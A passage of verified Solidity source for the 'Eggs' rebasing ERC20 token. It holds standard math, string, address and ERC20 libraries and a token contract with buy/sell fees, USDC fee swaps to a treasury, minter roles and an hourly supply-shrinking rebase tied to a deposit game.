/**
 *Submitted for verification at Etherscan.io on 2023-02-02
 */

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IDepositGame {
	function updateMintAmount(uint256 amount) external;
}

library Math {
	enum Rounding {
		Down, // Toward negative infinity
		Up, // Toward infinity
		Zero // Toward zero
	}

	/**
	 * @dev Returns the largest of two numbers.
	 */
	function max(uint256 a, uint256 b) internal pure returns (uint256) {
		return a > b ? a : b;
	}

	/**
	 * @dev Returns the smallest of two numbers.
	 */
	function min(uint256 a, uint256 b) internal pure returns (uint256) {
		return a < b ? a : b;
	}

	/**
	 * @dev Returns the average of two numbers. The result is rounded towards
	 * zero.
	 */
	function average(uint256 a, uint256 b) internal pure returns (uint256) {
		// (a + b) / 2 can overflow.
		return (a & b) + (a ^ b) / 2;
	}

	/**
	 * @dev Returns the ceiling of the division of two numbers.
	 *
	 * This differs from standard division with `/` in that it rounds up instead
	 * of rounding down.
	 */
	function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {
		// (a + b - 1) / b can overflow on addition, so we distribute.
		return a == 0 ? 0 : (a - 1) / b + 1;
	}

	/**
	 * @notice Calculates floor(x * y / denominator) with full precision. Throws if result overflows a uint256 or denominator == 0
	 * @dev Original credit to Remco Bloemen under MIT license (https://xn--2-umb.com/21/muldiv)
	 * with further edits by Uniswap Labs also under MIT license.
	 */
	function mulDiv(uint256 x, uint256 y, uint256 denominator) internal pure returns (uint256 result) {
		unchecked {
			// 512-bit multiply [prod1 prod0] = x * y. Compute the product mod 2^256 and mod 2^256 - 1, then use
			// use the Chinese Remainder Theorem to reconstruct the 512 bit result. The result is stored in two 256
			// variables such that product = prod1 * 2^256 + prod0.
			uint256 prod0; // Least significant 256 bits of the product
			uint256 prod1; // Most significant 256 bits of the product
			assembly {
				let mm := mulmod(x, y, not(0))
				prod0 := mul(x, y)
				prod1 := sub(sub(mm, prod0), lt(mm, prod0))
			}

			// Handle non-overflow cases, 256 by 256 division.
			if (prod1 == 0) {
				return prod0 / denominator;
			}

			// Make sure the result is less than 2^256. Also prevents denominator == 0.
			require(denominator > prod1);

			///////////////////////////////////////////////
			// 512 by 256 division.
			///////////////////////////////////////////////

			// Make division exact by subtracting the remainder from [prod1 prod0].
			uint256 remainder;
			assembly {
				// Compute remainder using mulmod.
				remainder := mulmod(x, y, denominator)

				// Subtract 256 bit number from 512 bit number.
				prod1 := sub(prod1, gt(remainder, prod0))
				prod0 := sub(prod0, remainder)
			}

			// Factor powers of two out of denominator and compute largest power of two divisor of denominator. Always >= 1.
			// See https://cs.stackexchange.com/q/138556/92363.

			// Does not overflow because the denominator cannot be zero at this stage in the function.
			uint256 twos = denominator & (~denominator + 1);
			assembly {
				// Divide denominator by twos.
				denominator := div(denominator, twos)

				// Divide [prod1 prod0] by twos.
				prod0 := div(prod0, twos)

				// Flip twos such that it is 2^256 / twos. If twos is zero, then it becomes one.
				twos := add(div(sub(0, twos), twos), 1)
			}

			// Shift in bits from prod1 into prod0.
			prod0 |= prod1 * twos;

			// Invert denominator mod 2^256. Now that denominator is an odd number, it has an inverse modulo 2^256 such
			// that denominator * inv = 1 mod 2^256. Compute the inverse by starting with a seed that is correct for
			// four bits. That is, denominator * inv = 1 mod 2^4.
			uint256 inverse = (3 * denominator) ^ 2;

			// Use the Newton-Raphson iteration to improve the precision. Thanks to Hensel's lifting lemma, this also works
			// in modular arithmetic, doubling the correct bits in each step.
			inverse *= 2 - denominator * inverse; // inverse mod 2^8
			inverse *= 2 - denominator * inverse; // inverse mod 2^16
			inverse *= 2 - denominator * inverse; // inverse mod 2^32
			inverse *= 2 - denominator * inverse; // inverse mod 2^64
			inverse *= 2 - denominator * inverse; // inverse mod 2^128
			inverse *= 2 - denominator * inverse; // inverse mod 2^256

			// Because the division is now exact we can divide by multiplying with the modular inverse of denominator.
			// This will give us the correct result modulo 2^256. Since the preconditions guarantee that the outcome is
			// less than 2^256, this is the final result. We don't need to compute the high bits of the result and prod1
			// is no longer required.
			result = prod0 * inverse;
			return result;
		}
	}

	/**
	 * @notice Calculates x * y / denominator with full precision, following the selected rounding direction.
	 */
	function mulDiv(uint256 x, uint256 y, uint256 denominator, Rounding rounding) internal pure returns (uint256) {
		uint256 result = mulDiv(x, y, denominator);
		if (rounding == Rounding.Up && mulmod(x, y, denominator) > 0) {
			result += 1;
		}
		return result;
	}

	function sqrt(uint256 a) internal pure returns (uint256) {
		if (a == 0) {
			return 0;
		}
		uint256 result = 1 << (log2(a) >> 1);
		unchecked {
			result = (result + a / result) >> 1;
			result = (result + a / result) >> 1;
			result = (result + a / result) >> 1;
			result = (result + a / result) >> 1;
			result = (result + a / result) >> 1;
			result = (result + a / result) >> 1;
			result = (result + a / result) >> 1;
			return min(result, a / result);
		}
	}

	function sqrt(uint256 a, Rounding rounding) internal pure returns (uint256) {
		unchecked {
			uint256 result = sqrt(a);
			return result + (rounding == Rounding.Up && result * result < a ? 1 : 0);
		}
	}

	function log2(uint256 value) internal pure returns (uint256) {
		uint256 result = 0;
		unchecked {
			if (value >> 128 > 0) {
				value >>= 128;
				result += 128;
			}
			if (value >> 64 > 0) {
				value >>= 64;
				result += 64;
			}
			if (value >> 32 > 0) {
				value >>= 32;
				result += 32;
			}
			if (value >> 16 > 0) {
				value >>= 16;
				result += 16;
			}
			if (value >> 8 > 0) {
				value >>= 8;
				result += 8;
			}
			if (value >> 4 > 0) {
				value >>= 4;
				result += 4;
			}
			if (value >> 2 > 0) {
				value >>= 2;
				result += 2;
			}
			if (value >> 1 > 0) {
				result += 1;
			}
		}
		return result;
	}

	function log2(uint256 value, Rounding rounding) internal pure returns (uint256) {
		unchecked {
			uint256 result = log2(value);
			return result + (rounding == Rounding.Up && 1 << result < value ? 1 : 0);
		}
	}

	function log10(uint256 value) internal pure returns (uint256) {
		uint256 result = 0;
		unchecked {
			if (value >= 10 ** 64) {
				value /= 10 ** 64;
				result += 64;
			}
			if (value >= 10 ** 32) {
				value /= 10 ** 32;
				result += 32;
			}
			if (value >= 10 ** 16) {
				value /= 10 ** 16;
				result += 16;
			}
			if (value >= 10 ** 8) {
				value /= 10 ** 8;
				result += 8;
			}
			if (value >= 10 ** 4) {
				value /= 10 ** 4;
				result += 4;
			}
			if (value >= 10 ** 2) {
				value /= 10 ** 2;
				result += 2;
			}
			if (value >= 10 ** 1) {
				result += 1;
			}
		}
		return result;
	}

	function log10(uint256 value, Rounding rounding) internal pure returns (uint256) {
		unchecked {
			uint256 result = log10(value);
			return result + (rounding == Rounding.Up && 10 ** result < value ? 1 : 0);
		}
	}

	function log256(uint256 value) internal pure returns (uint256) {
		uint256 result = 0;
		unchecked {
			if (value >> 128 > 0) {
				value >>= 128;
				result += 16;
			}
			if (value >> 64 > 0) {
				value >>= 64;
				result += 8;
			}
			if (value >> 32 > 0) {
				value >>= 32;
				result += 4;
			}
			if (value >> 16 > 0) {
				value >>= 16;
				result += 2;
			}
			if (value >> 8 > 0) {
				result += 1;
			}
		}
		return result;
	}

	function log256(uint256 value, Rounding rounding) internal pure returns (uint256) {
		unchecked {
			uint256 result = log256(value);
			return result + (rounding == Rounding.Up && 1 << (result * 8) < value ? 1 : 0);
		}
	}
}

pragma solidity ^0.8.0;

library Strings {
	bytes16 private constant _SYMBOLS = "0123456789abcdef";
	uint8 private constant _ADDRESS_LENGTH = 20;

	function toString(uint256 value) internal pure returns (string memory) {
		unchecked {
			uint256 length = Math.log10(value) + 1;
			string memory buffer = new string(length);
			uint256 ptr;
			/// @solidity memory-safe-assembly
			assembly {
				ptr := add(buffer, add(32, length))
			}
			while (true) {
				ptr--;
				/// @solidity memory-safe-assembly
				assembly {
					mstore8(ptr, byte(mod(value, 10), _SYMBOLS))
				}
				value /= 10;
				if (value == 0) break;
			}
			return buffer;
		}
	}

	function toHexString(uint256 value) internal pure returns (string memory) {
		unchecked {
			return toHexString(value, Math.log256(value) + 1);
		}
	}

	function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
		bytes memory buffer = new bytes(2 * length + 2);
		buffer[0] = "0";
		buffer[1] = "x";
		for (uint256 i = 2 * length + 1; i > 1; --i) {
			buffer[i] = _SYMBOLS[value & 0xf];
			value >>= 4;
		}
		require(value == 0, "Strings: hex length insufficient");
		return string(buffer);
	}

	function toHexString(address addr) internal pure returns (string memory) {
		return toHexString(uint256(uint160(addr)), _ADDRESS_LENGTH);
	}
}

pragma solidity ^0.8.0;

abstract contract Context {
	function _msgSender() internal view virtual returns (address) {
		return msg.sender;
	}

	function _msgData() internal view virtual returns (bytes calldata) {
		return msg.data;
	}
}

pragma solidity ^0.8.0;

abstract contract Ownable is Context {
	address private _owner;

	event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

	constructor() {
		_transferOwnership(_msgSender());
	}

	modifier onlyOwner() {
		_checkOwner();
		_;
	}

	function owner() public view virtual returns (address) {
		return _owner;
	}

	function _checkOwner() internal view virtual {
		require(owner() == _msgSender(), "Ownable: caller is not the owner");
	}

	function renounceOwnership() public virtual onlyOwner {
		_transferOwnership(address(0));
	}

	function transferOwnership(address newOwner) public virtual onlyOwner {
		require(newOwner != address(0), "Ownable: new owner is the zero address");
		_transferOwnership(newOwner);
	}

	function _transferOwnership(address newOwner) internal virtual {
		address oldOwner = _owner;
		_owner = newOwner;
		emit OwnershipTransferred(oldOwner, newOwner);
	}
}

pragma solidity ^0.8.1;

library Address {
	function isContract(address account) internal view returns (bool) {
		// This method relies on extcodesize/address.code.length, which returns 0
		// for contracts in construction, since the code is only stored at the end
		// of the constructor execution.

		return account.code.length > 0;
	}

	function sendValue(address payable recipient, uint256 amount) internal {
		require(address(this).balance >= amount, "Address: insufficient balance");

		(bool success, ) = recipient.call{ value: amount }("");
		require(success, "Address: unable to send value, recipient may have reverted");
	}

	function functionCall(address target, bytes memory data) internal returns (bytes memory) {
		return functionCallWithValue(target, data, 0, "Address: low-level call failed");
	}

	function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
		return functionCallWithValue(target, data, 0, errorMessage);
	}

	function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
		return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
	}

	function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
		require(address(this).balance >= value, "Address: insufficient balance for call");
		(bool success, bytes memory returndata) = target.call{ value: value }(data);
		return verifyCallResultFromTarget(target, success, returndata, errorMessage);
	}

	function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
		return functionStaticCall(target, data, "Address: low-level static call failed");
	}

	function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
		(bool success, bytes memory returndata) = target.staticcall(data);
		return verifyCallResultFromTarget(target, success, returndata, errorMessage);
	}

	function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
		return functionDelegateCall(target, data, "Address: low-level delegate call failed");
	}

	function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
		(bool success, bytes memory returndata) = target.delegatecall(data);
		return verifyCallResultFromTarget(target, success, returndata, errorMessage);
	}

	function verifyCallResultFromTarget(
		address target,
		bool success,
		bytes memory returndata,
		string memory errorMessage
	) internal view returns (bytes memory) {
		if (success) {
			if (returndata.length == 0) {
				// only check isContract if the call was successful and the return data is empty
				// otherwise we already know that it was a contract
				require(isContract(target), "Address: call to non-contract");
			}
			return returndata;
		} else {
			_revert(returndata, errorMessage);
		}
	}

	function verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) internal pure returns (bytes memory) {
		if (success) {
			return returndata;
		} else {
			_revert(returndata, errorMessage);
		}
	}

	function _revert(bytes memory returndata, string memory errorMessage) private pure {
		// Look for revert reason and bubble it up if present
		if (returndata.length > 0) {
			// The easiest way to bubble the revert reason is using memory via assembly
			/// @solidity memory-safe-assembly
			assembly {
				let returndata_size := mload(returndata)
				revert(add(32, returndata), returndata_size)
			}
		} else {
			revert(errorMessage);
		}
	}
}

pragma solidity ^0.8.0;

interface IERC20 {
	event Transfer(address indexed from, address indexed to, uint256 value);
	event Approval(address indexed owner, address indexed spender, uint256 value);

	function totalSupply() external view returns (uint256);

	function balanceOf(address account) external view returns (uint256);

	function transfer(address to, uint256 amount) external returns (bool);

	function allowance(address owner, address spender) external view returns (uint256);

	function approve(address spender, uint256 amount) external returns (bool);

	function transferFrom(address from, address to, uint256 amount) external returns (bool);
}
pragma solidity ^0.8.0;

interface IERC20Metadata is IERC20 {
	function name() external view returns (string memory);

	function symbol() external view returns (string memory);

	function decimals() external view returns (uint8);
}

pragma solidity ^0.8.0;

contract ERC20 is Context, IERC20, IERC20Metadata {
	mapping(address => uint256) private _balances;

	mapping(address => mapping(address => uint256)) private _allowances;

	uint256 private _totalSupply;

	string private _name;
	string private _symbol;

	constructor(string memory name_, string memory symbol_) {
		_name = name_;
		_symbol = symbol_;
	}

	function name() public view virtual override returns (string memory) {
		return _name;
	}

	function symbol() public view virtual override returns (string memory) {
		return _symbol;
	}

	function decimals() public view virtual override returns (uint8) {
		return 18;
	}

	function totalSupply() public view virtual override returns (uint256) {
		return _totalSupply;
	}

	function balanceOf(address account) public view virtual override returns (uint256) {
		return _balances[account];
	}

	function transfer(address to, uint256 amount) public virtual override returns (bool) {
		address owner = _msgSender();
		_transfer(owner, to, amount);
		return true;
	}

	function allowance(address owner, address spender) public view virtual override returns (uint256) {
		return _allowances[owner][spender];
	}

	function approve(address spender, uint256 amount) public virtual override returns (bool) {
		address owner = _msgSender();
		_approve(owner, spender, amount);
		return true;
	}

	function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
		address spender = _msgSender();
		_spendAllowance(from, spender, amount);
		_transfer(from, to, amount);
		return true;
	}

	function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
		address owner = _msgSender();
		_approve(owner, spender, allowance(owner, spender) + addedValue);
		return true;
	}

	function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
		address owner = _msgSender();
		uint256 currentAllowance = allowance(owner, spender);
		require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
		unchecked {
			_approve(owner, spender, currentAllowance - subtractedValue);
		}

		return true;
	}

	function _transfer(address from, address to, uint256 amount) internal virtual {
		require(from != address(0), "ERC20: transfer from the zero address");
		require(to != address(0), "ERC20: transfer to the zero address");

		_beforeTokenTransfer(from, to, amount);

		uint256 fromBalance = _balances[from];
		require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
		unchecked {
			_balances[from] = fromBalance - amount;
			// Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
			// decrementing then incrementing.
			_balances[to] += amount;
		}

		emit Transfer(from, to, amount);

		_afterTokenTransfer(from, to, amount);
	}

	function _mint(address account, uint256 amount) internal virtual {
		require(account != address(0), "ERC20: mint to the zero address");

		_beforeTokenTransfer(address(0), account, amount);

		_totalSupply += amount;
		unchecked {
			// Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
			_balances[account] += amount;
		}
		emit Transfer(address(0), account, amount);

		_afterTokenTransfer(address(0), account, amount);
	}

	function _burn(address account, uint256 amount) internal virtual {
		require(account != address(0), "ERC20: burn from the zero address");

		_beforeTokenTransfer(account, address(0), amount);

		uint256 accountBalance = _balances[account];
		require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
		unchecked {
			_balances[account] = accountBalance - amount;
			// Overflow not possible: amount <= accountBalance <= totalSupply.
			_totalSupply -= amount;
		}

		emit Transfer(account, address(0), amount);

		_afterTokenTransfer(account, address(0), amount);
	}

	function _approve(address owner, address spender, uint256 amount) internal virtual {
		require(owner != address(0), "ERC20: approve from the zero address");
		require(spender != address(0), "ERC20: approve to the zero address");

		_allowances[owner][spender] = amount;
		emit Approval(owner, spender, amount);
	}

	function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
		uint256 currentAllowance = allowance(owner, spender);
		if (currentAllowance != type(uint256).max) {
			require(currentAllowance >= amount, "ERC20: insufficient allowance");
			unchecked {
				_approve(owner, spender, currentAllowance - amount);
			}
		}
	}

	function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}

	function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}

pragma solidity ^0.8.0;

abstract contract ERC20Burnable is Context, ERC20 {
	function burn(uint256 amount) public virtual {
		_burn(_msgSender(), amount);
	}

	function burnFrom(address account, uint256 amount) public virtual {
		_spendAllowance(account, _msgSender(), amount);
		_burn(account, amount);
	}
}

pragma solidity ^0.8.0;

library SafeERC20 {
	using Address for address;

	function safeTransfer(IERC20 token, address to, uint256 value) internal {
		_callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
	}

	function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
		_callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
	}

	function safeApprove(IERC20 token, address spender, uint256 value) internal {
		// safeApprove should only be called when setting an initial allowance,
		// or when resetting it to zero. To increase and decrease it, use
		// 'safeIncreaseAllowance' and 'safeDecreaseAllowance'
		require((value == 0) || (token.allowance(address(this), spender) == 0), "SafeERC20: approve from non-zero to non-zero allowance");
		_callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
	}

	function safeIncreaseAllowance(IERC20 token, address spender, uint256 value) internal {
		uint256 newAllowance = token.allowance(address(this), spender) + value;
		_callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
	}

	function safeDecreaseAllowance(IERC20 token, address spender, uint256 value) internal {
		unchecked {
			uint256 oldAllowance = token.allowance(address(this), spender);
			require(oldAllowance >= value, "SafeERC20: decreased allowance below zero");
			uint256 newAllowance = oldAllowance - value;
			_callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
		}
	}

	function _callOptionalReturn(IERC20 token, bytes memory data) private {
		bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
		if (returndata.length > 0) {
			// Return data is optional
			require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
		}
	}
}

pragma solidity ^0.8.0;

library SafeMath {
	function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
		unchecked {
			uint256 c = a + b;
			if (c < a) return (false, 0);
			return (true, c);
		}
	}

	function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
		unchecked {
			if (b > a) return (false, 0);
			return (true, a - b);
		}
	}

	function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
		unchecked {
			// Gas optimization: this is cheaper than requiring 'a' not being zero, but the
			// benefit is lost if 'b' is also tested.
			// See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
			if (a == 0) return (true, 0);
			uint256 c = a * b;
			if (c / a != b) return (false, 0);
			return (true, c);
		}
	}

	function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
		unchecked {
			if (b == 0) return (false, 0);
			return (true, a / b);
		}
	}

	function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
		unchecked {
			if (b == 0) return (false, 0);
			return (true, a % b);
		}
	}

	function add(uint256 a, uint256 b) internal pure returns (uint256) {
		return a + b;
	}

	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
		return a - b;
	}

	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
		return a * b;
	}

	function div(uint256 a, uint256 b) internal pure returns (uint256) {
		return a / b;
	}

	function mod(uint256 a, uint256 b) internal pure returns (uint256) {
		return a % b;
	}

	function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
		unchecked {
			require(b <= a, errorMessage);
			return a - b;
		}
	}

	function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
		unchecked {
			require(b > 0, errorMessage);
			return a / b;
		}
	}

	function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
		unchecked {
			require(b > 0, errorMessage);
			return a % b;
		}
	}
}

// File: contracts/IEGGS.sol

pragma solidity ^0.8.0;

abstract contract IEGGS {
	/**
	 * @notice Event emitted when tokens are rebased
	 */
	event Rebase(uint256 epoch, uint256 prevEggssScalingFactor, uint256 newEggssScalingFactor);

	/* - Extra Events - */
	/**
	 * @notice Tokens minted event
	 */
	event Mint(address to, uint256 amount);

	/**
	 * @notice Tokens burned event
	 */
	event Burn(address from, uint256 amount);
}

interface ISwapRouter {
	function factory() external pure returns (address);

	function WETH() external pure returns (address);

	function swapExactTokensForTokensSupportingFeeOnTransferTokens(
		uint amountIn,
		uint amountOutMin,
		address[] calldata path,
		address to,
		uint deadline
	) external;
}

interface ISwapFactory {
	function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Pair {
	event Sync(uint112 reserve0, uint112 reserve1);

	function sync() external;
}

contract TokenDistributor {
	constructor(address token) {
		IERC20(token).approve(msg.sender, uint(~uint256(0)));
	}
}

pragma solidity ^0.8.0;

contract Eggs is ERC20Burnable, Ownable, IEGGS {
	using SafeMath for uint256;

	/**
	 * @dev Guard variable for re-entrancy checks. Not currently used
	 */
	bool internal _notEntered;

	mapping(address => bool) mintRole;

	/**
	 * @notice Internal decimals used to handle scaling factor
	 */
	uint256 public constant internalDecimals = 10 ** 24;

	/**
	 * @notice Used for percentage maths
	 */
	uint256 public constant BASE = 10 ** 18;
	uint public rebaseRate = 2.4e17;
	uint public rebaseTime = 3600;

	/**
	 * @notice Scaling factor that adjusts everyone's balances
	 */
	uint256 public eggssScalingFactor;

	mapping(address => uint256) internal _eggsBalances;

	mapping(address => mapping(address => uint256)) internal _allowedFragments;

	uint256 private _totalSupply;

	uint256 public lastRebaseTimestamp;

	IDepositGame public depositGame;
	address public _mainPair;
	mapping(address => bool) private _feeWhiteList;
	bool private inSwap;
	uint public buyFee = 2;
	uint public sellFee = 10;
	address public treasury;
	bool public sellFlag = true;
	bool public swapFlag = true;

	address public usdc;
	TokenDistributor _tokenDistributor;
	ISwapRouter public _swapRouter;

	uint256 private constant MAX = ~uint256(0);

	modifier validRecipient(address to) {
		require(to != address(0x0));
		require(to != address(this));
		_;
	}

	modifier lockTheSwap() {
		inSwap = true;
		_;
		inSwap = false;
	}

	modifier onlyMinter() {
		require(mintRole[_msgSender()], "Must have minter role");
		_;
	}

	constructor(string memory _name, string memory _symbol, address _usdc, address _router, address _treasury) ERC20(_name, _symbol) {
		lastRebaseTimestamp = block.timestamp;
		usdc = _usdc;
		treasury = _treasury;
		_swapRouter = ISwapRouter(_router);
		ISwapFactory swapFactory = ISwapFactory(_swapRouter.factory());
		_mainPair = swapFactory.createPair(address(this), usdc);

		_allowedFragments[address(this)][address(_swapRouter)] = MAX;
		IERC20(usdc).approve(address(_swapRouter), MAX);
		_feeWhiteList[address(this)] = true;
		_feeWhiteList[address(_swapRouter)] = true;
		_feeWhiteList[msg.sender] = true;
		_feeWhiteList[treasury] = true;
		_feeWhiteList[address(0x000000000000000000000000000000000000dEaD)] = true;
		_feeWhiteList[address(0x0000000000000000000000000000000000000000)] = true;

		mintRole[msg.sender] = true;

		eggssScalingFactor = BASE;

		_tokenDistributor = new TokenDistributor(usdc);
	}

	function setDepositGame(address _depositGame) public onlyOwner {
		depositGame = IDepositGame(_depositGame);
		mintRole[_depositGame] = true;
		_feeWhiteList[_depositGame] = true;
	}

	/**
	 * @return The total number of fragments.
	 */
	function totalSupply() public view override returns (uint256) {
		return _totalSupply;
	}

	/**
	 * @notice Mints new tokens, increasing totalSupply,   and a users balance.
	 */
	function mint(address to, uint256 amount) external returns (bool) {
		require(mintRole[_msgSender()], "Must have minter role");
		_mint(to, amount);
		return true;
	}

	function _mint(address to, uint256 amount) internal override {
		// increase totalSupply
		_totalSupply = _totalSupply.add(amount);

		// get underlying value
		uint256 eggsValue = _fragmentToEggs(amount);

		// add balance
		_eggsBalances[to] = _eggsBalances[to].add(eggsValue);

		emit Mint(to, amount);
		emit Transfer(address(0), to, amount);
	}

	/**
	 * @notice Burns tokens from msg.sender, decreases totalSupply,   and a users balance.
	 */

	function burn(uint256 amount) public override {
		_burn(amount);
	}

	function _burn(uint256 amount) internal {
		// decrease totalSupply
		_totalSupply = _totalSupply.sub(amount);

		// get underlying value
		uint256 eggsValue = _fragmentToEggs(amount);

		// decrease balance
		_eggsBalances[msg.sender] = _eggsBalances[msg.sender].sub(eggsValue);
		emit Burn(msg.sender, amount);
		emit Transfer(msg.sender, address(0), amount);
	}

	/**
	 * @notice Mints new tokens using underlying amount, increasing totalSupply,   and a users balance.
	 */
	function mintUnderlying(address to, uint256 amount) public returns (bool) {
		require(mintRole[_msgSender()], "Must have minter role");
		_mintUnderlying(to, amount);
		return true;
	}

	function _mintUnderlying(address to, uint256 amount) internal {
		// get external value
		uint256 scaledAmount = _eggsToFragment(amount);

		// increase totalSupply
		_totalSupply = _totalSupply.add(scaledAmount);

		// add balance
		_eggsBalances[to] = _eggsBalances[to].add(amount);

		emit Mint(to, scaledAmount);
		emit Transfer(address(0), to, scaledAmount);
	}

	function transferUnderlying(address to, uint256 value) public validRecipient(to) returns (bool) {
		// sub from balance of sender
		_eggsBalances[msg.sender] = _eggsBalances[msg.sender].sub(value);

		// add to balance of receiver
		_eggsBalances[to] = _eggsBalances[to].add(value);
		emit Transfer(msg.sender, to, _eggsToFragment(value));
		return true;
	}

	function transfer(address to, uint256 value) public override validRecipient(to) returns (bool) {
		_transfer(msg.sender, to, value);
		return true;
	}

	function _transfer(address from, address to, uint value) internal override {
		// get amount in underlying
		uint256 eggsValue = _fragmentToEggs(value);

		require(_eggsBalances[from] >= eggsValue, "ERC20: transfer amount exceeds balance");

		// sub from balance of sender
		_eggsBalances[from] = _eggsBalances[from].sub(eggsValue);

		uint realityTxFee;
		uint256 fragmentTxFee;

		//to == _mainPair sell
		if (_mainPair == to && !_feeWhiteList[from]) {
			require(sellFlag, "sell is not open");
			realityTxFee = value.mul(sellFee).div(100);
			fragmentTxFee = eggsValue.mul(sellFee).div(100);
			_eggsBalances[address(this)] = _eggsBalances[address(this)].add(fragmentTxFee);
			emit Transfer(from, address(this), realityTxFee);
		}

		// _mainPair == from buy
		if (_mainPair == from && !_feeWhiteList[to]) {
			realityTxFee = value.mul(buyFee).div(100);
			fragmentTxFee = eggsValue.mul(buyFee).div(100);
			_eggsBalances[address(this)] = _eggsBalances[address(this)].add(fragmentTxFee);
			emit Transfer(from, address(this), realityTxFee);
		}

		uint256 contractTokenBalance = balanceOf(address(this));
		if (contractTokenBalance > 0 && !inSwap && from != _mainPair && swapFlag) {
			swapTokenForFund(contractTokenBalance);
		}

		eggsValue = eggsValue.sub(fragmentTxFee);
		value = value.sub(realityTxFee);
		// add to balance of receiver
		_eggsBalances[to] = _eggsBalances[to].add(eggsValue);
		emit Transfer(from, to, value);
	}

	function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
		swapTokensForUsdc(tokenAmount);
		IERC20 USDC = IERC20(usdc);
		uint256 newBalance = USDC.balanceOf(address(_tokenDistributor));
		USDC.transferFrom(address(_tokenDistributor), treasury, newBalance);
	}

	function swapTokensForUsdc(uint256 tokenAmount) private {
		address[] memory path = new address[](2);
		path[0] = address(this);
		path[1] = usdc;
		_swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
			tokenAmount,
			0, // accept any amount of ETH
			path,
			address(_tokenDistributor),
			block.timestamp
		);
	}

	function transferFrom(address from, address to, uint256 value) public override validRecipient(to) returns (bool) {
		// decrease allowance
		_allowedFragments[from][msg.sender] = _allowedFragments[from][msg.sender].sub(value);

		_transfer(from, to, value);

		return true;
	}

	function balanceOf(address who) public view override returns (uint256) {
		return _eggsToFragment(_eggsBalances[who]);
	}

	function balanceOfUnderlying(address who) public view returns (uint256) {
		return _eggsBalances[who];
	}

	function allowance(address owner_, address spender) public view override returns (uint256) {
		return _allowedFragments[owner_][spender];
	}

	function approve(address spender, uint256 value) public override returns (bool) {
		_allowedFragments[msg.sender][spender] = value;
		emit Approval(msg.sender, spender, value);
		return true;
	}

	function increaseAllowance(address spender, uint256 addedValue) public override returns (bool) {
		_allowedFragments[msg.sender][spender] = _allowedFragments[msg.sender][spender].add(addedValue);
		emit Approval(msg.sender, spender, _allowedFragments[msg.sender][spender]);
		return true;
	}

	function decreaseAllowance(address spender, uint256 subtractedValue) public override returns (bool) {
		uint256 oldValue = _allowedFragments[msg.sender][spender];
		if (subtractedValue >= oldValue) {
			_allowedFragments[msg.sender][spender] = 0;
		} else {
			_allowedFragments[msg.sender][spender] = oldValue.sub(subtractedValue);
		}
		emit Approval(msg.sender, spender, _allowedFragments[msg.sender][spender]);
		return true;
	}

	function getFactor(uint _timeInterval) public view returns (uint) {
		uint factor = 1e18;
		while (_timeInterval >= 86400) {
			_timeInterval -= 86400;
			factor = (factor * (BASE - rebaseRate)) / BASE;
		}
		if (_timeInterval > 0) {
			factor = (factor * (BASE - (rebaseRate * _timeInterval) / 86400)) / BASE;
		}
		return factor;
	}

	function rebase() public onlyMinter {
		uint256 prevEggssScalingFactor = eggssScalingFactor;
		uint timeInterval = rebaseTime;
		uint factor = getFactor(timeInterval); //3600 === 1 hour === 1% rebase
		eggssScalingFactor = eggssScalingFactor.mul(factor).div(BASE);
		uint prevTotalSupply = _totalSupply;
		_totalSupply = _totalSupply.mul(factor).div(BASE);
		uint mintAmount = prevTotalSupply - _totalSupply;
		updateDepositGame(mintAmount);
		IUniswapV2Pair(_mainPair).sync();
		emit Rebase(block.timestamp, prevEggssScalingFactor, eggssScalingFactor);
	}

	function eggsToFragment(uint256 eggs) public view returns (uint256) {
		return _eggsToFragment(eggs);
	}

	function fragmentToEggs(uint256 value) public view returns (uint256) {
		return _fragmentToEggs(value);
	}

	function _eggsToFragment(uint256 eggs) internal view returns (uint256) {
